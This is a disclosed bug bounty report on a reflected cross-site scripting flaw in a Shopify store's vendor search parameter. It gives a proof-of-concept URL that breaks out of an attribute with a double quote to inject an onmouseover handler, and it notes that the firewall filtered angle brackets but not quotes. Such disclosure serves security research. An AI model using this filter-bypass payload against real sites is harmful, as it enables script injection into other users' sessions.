# XSS *.myshopify.com/collections/vendors?q=

## Report Details
- **Report ID**: 324136
- **URL**: https://hackerone.com/reports/324136
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-03-10T05:58:07.680Z
- **Disclosed**: 2018-04-08T10:25:54.621Z

## Reporter
- **Username**: gromoza
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
WAF cut "<",">, but " and ' still in.
1. 
[PoC example link](https://lostvalues.myshopify.com/collections/vendors?q=X" onmouseover="alert('XSS')" style="font-size: 1001pt;") 
2.mouse on X
3. ..
4.XSS alert message

## Impact

XSS atack

## Attachments
- XSS.png
- Video_2018-03-10_110007.wmv
